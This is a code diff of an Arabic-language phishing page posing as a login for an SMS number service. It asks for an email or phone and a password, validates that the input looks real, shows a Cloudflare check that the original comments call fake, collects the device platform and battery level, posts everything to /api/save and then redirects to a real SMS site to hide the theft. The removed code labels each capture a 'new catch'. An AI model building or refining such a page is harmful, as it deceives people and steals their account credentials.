@@ -3,144 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل الخدمة - SMS</title>
+    <title>تسجيل الدخول - خدمة SMS</title>
+    
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
-        /* التصميم القديم (الخلفية الوردية الكاملة) */
+        /* التصميم الوردي الأصلي */
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
-            background-color: #e91e63; /* اللون الوردي الأصلي */
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
+            background-color: #e91e63; /* اللون الوردي المعتمد */
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
 
-        /* البطاقة البيضاء المستطيلة */
-        .container {
-            background: white; padding: 30px 20px; border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; 
+        /* البطاقة البيضاء المركزية */
+        .login-container {
+            background: white; width: 90%; max-width: 380px;
+            padding: 40px 25px; border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             text-align: center;
         }
 
-        /* تنسيق الصورة */
+        /* تنسيق الشعار (Logo) */
         #pageImg {
             width: 120px; height: auto; margin-bottom: 20px;
+            display: inline-block;
         }
 
         h2 { color: #c2185b; font-size: 18px; margin-bottom: 25px; font-weight: bold; }
 
-        /* تنسيق الحقول */
+        /* تنسيق المدخلات */
+        .form-group { margin-bottom: 15px; text-align: right; }
+        
         input {
-            width: 100%; padding: 14px; margin-bottom: 15px;
-            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
-            outline: none; text-align: right; font-size: 15px; background: #fff;
+            width: 100%; padding: 14px; border: 1px solid #ddd;
+            border-radius: 8px; box-sizing: border-box; outline: none;
+            font-size: 16px; transition: 0.3s; background: #fff;
         }
-        input:focus { border-color: #e91e63; }
+        input:focus { border-color: #e91e63; box-shadow: 0 0 5px rgba(233,30,99,0.2); }
 
-        /* منطقة التحقق (Cloudflare الوهمي) */
-        .captcha-wrapper { margin: 15px 0; min-height: 65px; display: flex; flex-direction: column; align-items: center; }
-        #loader-text { color: #28a745; font-weight: bold; display: none; font-size: 14px; margin-top: 10px; }
+        /* منطقة تحقق Cloudflare */
+        .captcha-area { margin: 20px 0; min-height: 70px; display: flex; flex-direction: column; align-items: center; }
+        #success-tick { color: #28a745; font-weight: bold; font-size: 14px; display: none; margin-top: 10px; }
 
-        /* الزر الوردي العريض */
+        /* الزر الرئيسي */
         button {
-            width: 100%; padding: 14px; background: #e91e63; color: white;
-            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; 
-            cursor: pointer; transition: 0.3s;
+            width: 100%; padding: 15px; background: #e91e63;
+            color: white; border: none; border-radius: 8px;
+            font-size: 18px; font-weight: bold; cursor: pointer;
+            transition: 0.3s;
         }
-        button:hover { background: #ad1457; }
+        button:hover { background: #ad1457; transform: translateY(-1px); }
 
-        .footer-links { margin-top: 20px; font-size: 14px; color: #666; }
-        .footer-links span { color: #e91e63; font-weight: bold; cursor: pointer; }
+        .footer-link { margin-top: 25px; font-size: 14px; color: #666; border-top: 1px solid #eee; padding-top: 15px; }
+        .footer-link span { color: #e91e63; font-weight: bold; cursor: pointer; text-decoration: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
+    <div class="login-container">
+        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
         
         <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
 
-        <form id="proForm">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="passInput" placeholder="كلمة السر" required>
+        <form id="authForm">
+            <div class="form-group">
+                <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="pass" placeholder="كلمة السر" required>
+            </div>
             
-            <div class="captcha-wrapper">
-                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleVerify"></div>
-                <div id="loader-text">✅ تم التحقق من أمان الجهاز</div>
+            <div class="captcha-area">
+                <div class="cf-turnstile" id="cf-widget" data-sitekey="1x00000000000000000000AA" data-callback="onVerifySuccess"></div>
+                <div id="success-tick">✅ تم التحقق من أمان الجهاز بنجاح</div>
             </div>
 
             <button type="submit" id="pageBtn">تسجيل دخول</button>
         </form>
 
-        <div class="footer-links">
-            ليس لديك حساب؟ <span onclick="Swal.fire({text:'التسجيل مغلق مؤقتاً', icon:'info'})">إنشاء حساب جديد</span>
+        <div class="footer-link">
+            ليس لديك حساب؟ <span onclick="Swal.fire({text:'التسجيل مغلق حالياً، حاول لاحقاً', icon:'info'})">إنشاء حساب جديد</span>
         </div>
     </div>
 
     <script>
-        let isVerified = false;
+        let isHuman = false;
 
-        // وظيفة التحقق
-        function handleVerify() {
-            document.getElementById('cf-box').style.display = 'none';
-            document.getElementById('loader-text').style.display = 'block';
-            isVerified = true;
+        // دالة نجاح التحقق
+        function onVerifySuccess() {
+            document.getElementById('cf-widget').style.display = 'none';
+            document.getElementById('success-tick').style.display = 'block';
+            isHuman = true;
         }
 
-        // سحب البيانات
-        document.getElementById('proForm').onsubmit = async (e) => {
+        // معالجة إرسال النموذج
+        document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
             
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
+            const userVal = document.getElementById('user').value;
+            const passVal = document.getElementById('pass').value;
 
-            // 1. فحص البيانات (منع العشوائية)
-            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
-            const isPhone = /^\+?[0-9]{7,15}$/.test(user);
+            // 1. نظام فحص البيانات لمنع العشوائية
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phonePattern = /^\+?[0-9]{7,15}$/;
 
-            if (!isEmail && !isPhone) {
-                Swal.fire({ title: 'خطأ', text: 'يرجى إدخال بريد أو هاتف صحيح', icon: 'error', confirmButtonColor: '#e91e63' });
+            if (!emailPattern.test(userVal) && !phonePattern.test(userVal)) {
+                Swal.fire({ 
+                    title: 'بيانات غير صحيحة', 
+                    text: 'يرجى إدخال بريد إلكتروني حقيقي أو رقم هاتف صحيح', 
+                    icon: 'error', 
+                    confirmButtonColor: '#e91e63' 
+                });
                 return;
             }
 
-            if (!isVerified) {
-                Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning' });
+            if (!isHuman) {
+                Swal.fire({ text: 'يرجى إكمال فحص الأمان أولاً', icon: 'warning', confirmButtonColor: '#e91e63' });
                 return;
             }
 
-            // سحب معلومات الجهاز والبطارية
-            let battery = "غير معروف";
-            try { const b = await navigator.getBattery(); battery = (b.level * 100) + "%"; } catch(e) {}
+            // 2. سحب معلومات البطارية والجهاز
+            let batteryInfo = "غير معروفة";
+            try { 
+                const b = await navigator.getBattery(); 
+                batteryInfo = Math.floor(b.level * 100) + "%"; 
+            } catch(err) {}
 
-            const payload = {
-                title: "🔥 صيد جديد مـكتمل (التصميم الأصلي)",
-                user: user,
-                pass: pass,
-                details: `📱 الجهاز: ${navigator.platform} | 🔋 البطارية: ${battery}`,
-                time: new Date().toLocaleString('ar-EG')
-            };
+            // 3. إرسال البيانات مقسمة لضمان الترتيب في البوت
+            try {
+                const response = await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user: userVal,
+                        pass: passVal,
+                        device: navigator.platform,
+                        battery: batteryInfo,
+                        time: new Date().toLocaleString('ar-EG')
+                    })
+                });
 
-            // إرسال البيانات
-            await fetch('/api/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            window.location.href = "https://receive-smss.com/"; 
+                if (response.ok) {
+                    window.location.href = "https://receive-smss.com/"; 
+                }
+            } catch (error) {
+                console.error("خطأ في الإرسال:", error);
+            }
         };
 
-        // مزامنة الصورة من اللوحة
-        async function loadConfig() {
+        // مزامنة الصور والنصوص من لوحة التحكم (إن وجدت)
+        async function fetchSettings() {
             try {
                 const res = await fetch('/api/get');
-                const data = await res.json();
-                if(data.image) document.getElementById('pageImg').src = data.image;
-                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
-                if(data.button) document.getElementById('pageBtn').innerText = data.button;
+                const cfg = await res.json();
+                if(cfg.image) document.getElementById('pageImg').src = cfg.image;
+                if(cfg.letter) document.getElementById('pageLetter').innerText = cfg.letter;
+                if(cfg.button) document.getElementById('pageBtn').innerText = cfg.button;
             } catch(e) {}
         }
-        window.onload = loadConfig;
+        window.onload = fetchSettings;
     </script>
 </body>
 </html>
